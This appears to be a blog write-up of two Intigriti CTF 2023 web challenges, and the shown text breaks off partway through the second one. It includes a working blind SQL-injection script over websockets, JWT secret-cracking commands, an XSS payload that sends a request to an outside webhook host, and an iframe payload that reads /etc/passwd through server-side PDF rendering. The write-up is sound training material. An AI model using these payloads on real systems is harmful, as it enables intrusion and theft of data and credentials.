---
title: Intigriti CTF 2023 Writeup [WEB]
author: H0j3n
date: 2023-11-19 00:00:00
categories: [ctf]
tags: [ctf,writeup]
render_with_liquid: false
---

![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/13_intigritictf_2023/intigriti_1.png)

Link to archive challenges: 

- [https://github.com/sajjadium/ctf-archives/tree/main/ctfs/1337UP/2023](https://github.com/sajjadium/ctf-archives/tree/main/ctfs/1337UP/2023)

# Category : Web

## Web : Bug Report Repo

![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/13_intigritictf_2023/intigriti_2.png)

Browsing the web challenge, we will encounter with a page that show the "Bug Reports". There is one visible search box that we can use to check the report **status** by using **BUG ID**

![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/13_intigritictf_2023/intigriti_3.png)

When we enter `BUG ID == 1` we can see the page highligted the first row but where is the user `Alice` coming from? Probably its query something behind this. 

![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/13_intigritictf_2023/intigriti_4.png)

How about if we try to insert single quote `'` instead? We got an error? Is there SQL Injection involved in here?

![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/13_intigritictf_2023/intigriti_5.png)

Let's try put a custom query to make it response with correct and wrong response. 

**Correct Response**

```cs
1 OR 1=1
```

![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/13_intigritictf_2023/intigriti_6.png)

**Wrong Response**

```cs
1 AND 1=2
```

![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/13_intigritictf_2023/intigriti_7.png)

Since we know it involve **SQL INJECTION**, next step is to find where is the flag located? It was mentioned in the challenge's description that it received a **CRITICAL** bug but it was not shown in the system. When we try to check on `BUG ID == 11` we receive an unusual user in the response.

![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/13_intigritictf_2023/intigriti_8.png)

Probably we will get hints when we look into this user's description. To do that we need exploit the **SQL Injection** and extract the description of bug id equal to 1. We can create an automation script to extract it. We also identified that its using *WEBSOCKETS* for the request.

![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/13_intigritictf_2023/intigriti_9.png)

Below are the full scripts to extract the description of `BUGID == 11`

```python
import string, base64
from websockets.sync.client import connect

def sqli(ws,q_left,chars):	
    data = """{"id":"11 and (%s='%s')"}""" % (q_left, chars)
    ws.send(data)
    temp = ws.recv()
    return "Open" in temp

def exploit_websockets(TARGET):
    dumped = ""
    with connect(TARGET) as ws:
        sql_template = "SELECT substr(description, %s, 1)"
        i = 1
        while True:
            for chars in string.printable:
                if sqli(ws,sql_template%i,chars):
                    dumped += chars
                    print(dumped)
                    i+=1
                    break
        
if __name__ == "__main__":
    TARGET = "wss://bountyrepo.ctf.intigriti.io/ws"
    exploit_websockets(TARGET)
```

Extracted : `crypt0:c4tz on /4dm1n_z0n3, really?`

Browsing `/4dm1n_z0n3` will get us into a secure admin login page. 

![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/13_intigritictf_2023/intigriti_10.png)

Using the credentials we found will get us into this page. Sadly our user `crypt0` don't have the permission to view the config key.

![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/13_intigritictf_2023/intigriti_11.png)

When we look at the cookies, it looks like **JWT** and yes it is. It using `alg == HS256`

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZGVudGl0eSI6ImNyeXB0MCJ9.zbwLInZCdG8Le5iH1fb5GHB5OM4bYOm8d5gZ2AbEu_I
```

![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/13_intigritictf_2023/intigriti_12.png)

By reading in the [Hacktricks](https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens#change-the-algorithm-rs256-asymmetric-to-hs256-symmetric-cve-2016-5431-cve-2016-10555) we probably need to crack the JWT and find the secret key? Let's give it a try using [jwtcrack](https://github.com/Sjord/jwtcrack)

> `Algorithm HS256` : Uses the secret key to sign and verify each message
{: .prompt-info }

```
# jwt2john
./jwt2john.py "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZGVudGl0eSI6ImNyeXB0MCJ9.zbwLInZCdG8Le5iH1fb5GHB5OM4bYOm8d5gZ2AbEu_I" > hash

# john
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

Found : `catsarethebest`

Next, we can easily modify our **JWT** in [here](https://jwt.io/) with the secret key we found.

![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/13_intigritictf_2023/intigriti_13.png)

And we get the flag!

![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/13_intigritictf_2023/intigriti_14.png)

Flag : `INTIGRITI{w3b50ck37_5ql1_4nd_w34k_jw7}`

## Web : My Music

![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/13_intigritictf_2023/intigriti_15.png)

I didn't managed to solve this challenge during the event but it's a good practice to solve an unsolved challenge after the event. Thanks to all of the writeup from others CTF players!

We can see that there are **Login** and **Register** tabs at the top of the page

![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/13_intigritictf_2023/intigriti_16.png)

Let's try register an account first.

![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/13_intigritictf_2023/intigriti_17.png)

We have `login hash`, `update function` and `generate profile card` which could help us to look for vulnerability in this page.

![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/13_intigritictf_2023/intigriti_18.png)

The login page only receive the `login hash` to login. A valid hash will lead us to the home page of the user, while invalid hash will give us an error. Nothing much I manage to find in this login page, so let's move on to the update function. 

**Invalid Login Hash**

![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/13_intigritictf_2023/intigriti_19.png)

The update function will send a `PUT` method to `/api/user` and there are three (3) parameters we can update in here.

![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/13_intigritictf_2023/intigriti_20.png)

The generate function will send a `POST` method to `/profile/generate-profile-card` and there is no parameter used and it needs the cookies `login_hash`

![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/13_intigritictf_2023/intigriti_21.png)

The PDF generated will have all the value of parameters `username,firstname,lastname,spotifyTrackCode`.

![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/13_intigritictf_2023/intigriti_22.png)

First thing come into my mind, is it a dynamic PDF generated? Will there be an injection related to server side? So mostly I referring in [here](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf?q=browse) while doing this challenge. So let's try insert html injection in all the parameters that we can update and generate again the PDF.

```json
{
    "firstName":"<h1>firstName</h1>","lastName":"<h1>lastName</h1>","spotifyTrackCode":"<h1>spotifyTrackCode</h1>"
}
```

![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/13_intigritictf_2023/intigriti_23.png)

Nice, atleast one parameter `spotifyTrackCode` vulnerable to `HTML Injection`. But is it just a normal `HTML Injection`? Let's try insert one XSS that try request to our webhook.

```cs
<img src=x onerror=fetch('https://webhook.site/edf38419-6f01-4b60-aa0e-2428b2089bef') />
```

Nice we got a request!

![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/13_intigritictf_2023/intigriti_24.png)

So now we know that it involve with server side, let's use simple payload to read local file such as `/etc/passwd`

```html
<iframe src=file:///etc/passwd height=2000 width=800></iframe>
```

![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/13_intigritictf_2023/intigriti_25.png)

So I tried to read almost all of the source code that I could find listed below:

```cs
/app/app.js 
/app/package.json
/app/routes/index.js 
/app/routes/api.js 
/app/views/register.handlebars
/app/services/user.js
/app/middleware/check_admin.js
/app/middleware/auth.js
/app/controllers/user.js
/app/utils/generateProfileCard.js
/app/views/print_profile.handlebars
/app/data/{hash}.json
/app/Dockerfile 
/etc/resolv.conf
```

To get the flag, we need to access `/admin` with **JSON** body which impossible for us to update through the web UI.

**routes/index.js**

```js
router.get('/admin', isAdmin, (req, res) => {
    res.render('admin', { flag: process.env.FLAG || 'CTF{DUMMY}' })
})
```

**middleware/check_admin.js**

```js
const { getUser, userExists } = require('../services/user')
const isAdmin = (req, res, next) => {
let loginHash = req.cookies['login_hash']
let userData

if (loginHash && userExists(loginHash)) {
    userData = getUser(loginHash)
} else {
    return res.redirect('/login')
}
try {
    userData = JSON.parse(userData)
    if (userData.isAdmin !== true) {
        res.status(403)
        res.send('Only admins can view this page')
        return
    }
} catch (e) {
    console.log(e)
}
next()
}

module.exports = { isAdmin }
```

The function `getUser(loginHas)` will get us better understanding on what `userData.isAdmin` is checking.

**services/user.js**

```js
const fs = require('fs')
const path = require('path')
const { createHash } = require('crypto')
const { v4: uuidv4 } = require('uuid')
const dataDir = './data'

// Register New User
// Write new data in  /app/data/<loginhash>.json
const createUser = (userData) => {
    const loginHash = createHash('sha256').update(uuidv4()).digest('hex')
        fs.writeFileSync(
            path.join(dataDir, `${loginHash}.json`),
            JSON.stringify(userData)
        )
    return loginHash
}

// Update User
// Update new data in  /app/data/<loginhash>.json
const setUserData = (loginHash, userData) => {
    if (!userExists(loginHash)) {
        throw 'Invalid login hash'
    }
    fs.writeFileSync(
        path.join(dataDir, `${path.basename(loginHash)}.json`),
        JSON.stringify(userData)
    )
    return userData
}

// Get User
// Read /app/data/<loginhash>.json
const getUser = (loginHash) => {
    let userData = fs.readFileSync(
        path.join(dataDir, `${path.basename(loginHash)}.json`),
        {
        encoding: 'utf8',
        }
    )
    return userData
}

// Check if UserExists
// Check if file /app/data/<loginhash>.json exists
const userExists = (loginHash) => {
    return fs.existsSync(path.join(dataDir, `${path.basename(loginHash)}.json`))
}
```

So `getUser()` will get us the `JSON` value of our user which will holds parameters such as `username, firstName, ` as shown inside the codes below.

**controllers/user.js**

```js
...
// Create User only accepts username, firstName, lastName
// There is no isAdmin available in here
const { username, firstName, lastName } = req.body
const userData = {
    username,
    firstName,
    lastName,
}
try {
    const loginHash = createUser(userData)
...
// Update user only accepts firstname, lastname, spotifyTrackCode
// Also there is no isAdmin available in here
const { firstName, lastName, spotifyTrackCode } = req.body
const userData = {
    username: req.userData.username,
    firstName,
    lastName,
    spotifyTrackCode,
}
try {
    setUserData(req.loginHash, userData)
...
```

One idea, that I had was to find a way to write the **JSON** payload with **isAdmin** into `/app/data` and use the cookies `login_hash` to load the **.json** file. Interestingly, inside the PDF generator function located in `utils/generateProfileCard.js`, there is a request body that we can send to add options into puppeteer pdf.

**routes/index.js**

```js
// We can send userOptions in the body
router.post('/profile/generate-profile-card', requireAuth, async (req, res) => {
    const pdf = await generatePDF(req.userData, req.body.userOptions)
    res.contentType('application/pdf')
    res.send(pdf)
})
```

**utils/generateProfileCard.js**

```js
...
const generatePDF = async (userData, userOptions) => {
    const browser = await puppeteer.launch({
        executablePath: '/usr/bin/google-chrome',
        args: ['--no-sandbox'],
    })
    const page = await browser.newPage()
    ...
    let options = {
    format: 'A5',
    }
    // Our userOptions will be use to generate the PDF
    if (userOptions) {
        options = { ...options, ...userOptions }
    }
    const pdf = await page.pdf(options)
    ...
}
...
```